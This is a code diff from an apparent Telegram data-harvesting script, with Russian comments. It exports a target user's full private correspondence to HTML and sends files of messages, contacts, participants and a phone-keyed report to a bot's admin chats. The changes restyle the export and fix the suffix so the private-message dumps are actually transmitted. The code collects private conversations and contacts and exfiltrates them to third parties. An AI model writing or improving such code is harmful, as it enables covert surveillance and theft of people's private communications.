@@ -41,28 +41,30 @@ def get_private_messages(client, target_user, userinfo):
    
     header = f"<h1>Переписка с: {user_id}, {username}, {first_name}, {last_name} #Выгрузка личных сообщений</h1>"
     
-    html_output = f"<html><head><title>Переписка</title><style>blockquote {{ background-color: #f2f2f2; }} em {{ font-style: italic; }} .recipient {{ background-color: #DCF8C6; }} .sender {{ background-color: #FFFFFF; }}</style></head><body>{header}"
+    html_output = f"<html><head><title>Переписка</title><style>blockquote {{ background-color: #f2f2f2; }} em {{ font-style: italic; }} .message {{ padding: 10px; border-bottom: 1px solid #ccc; }} .sender {{ background-color: #FFFFFF; }} .recipient {{ background-color: #DCF8C6; }}</style></head><body>{header}"
     try:
         for message in client.iter_messages(target_user):
             message_time = message.date.astimezone(minsk_timezone).strftime('%Y-%m-%d %H:%M:%S')
 
+            sender_info = "Вы" if message.sender_id == user_id else f"{first_name} {last_name}"
+            message_class = "recipient" if message.sender_id == user_id else "sender"
+
+            html_output += f"<div class='message {message_class}'><p><strong>{sender_info}</strong></p>"
             html_output += f"<p><strong>Дата и время:</strong> {message_time}</p>"
+
             if message.reply_to_msg_id:
                 original_message = client.get_messages(target_user, ids=message.reply_to_msg_id)
                 html_output += f"<blockquote><em>{escape(original_message.text)}</em></blockquote>"
             
-            # Определяем класс сообщения в зависимости от отправителя
-            message_class = "recipient" if message.sender_id == user_id else "sender"
-            html_output += f"<p class='{message_class}'><strong>Сообщение:</strong> {escape(message.text)}</p>"
+            html_output += f"<p><strong>Сообщение:</strong> {escape(message.text)}</p>"
             
-            # Получаем информацию о реакциях на сообщение
             reactions = message.reactions
             if reactions and reactions.recent_reactions:
                 reaction_info = " ".join(reaction.reaction.emoticon for reaction in reactions.recent_reactions)
                 if reaction_info:
                     html_output += f"<p><strong>Реакции:</strong> {reaction_info}</p>"
             
-            html_output += "<hr>"
+            html_output += "</div>"
     except Exception as e:
         html_output += f"<p>Ошибка при получении переписки: {e}</p>"
     html_output += "</body></html>"
@@ -70,7 +72,7 @@ def get_private_messages(client, target_user, userinfo):
     filename = f"{target_user}_private_messages.html"
     with open(filename, "w", encoding="utf-8") as file:
         file.write(html_output)
-
+    print(f"HTML-файл сохранен как '{filename}'")
 
 
 
@@ -1272,7 +1274,7 @@ def generate_html_report(phone, userid, userinfo, firstname, lastname, username,
     
 # Функци по отправке в боты
 def send_files_to_bot(bot, admin_chat_ids):
-    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_private_messages']
+    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_private_messages.html']
 
     for file_extension in file_extensions:
         files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
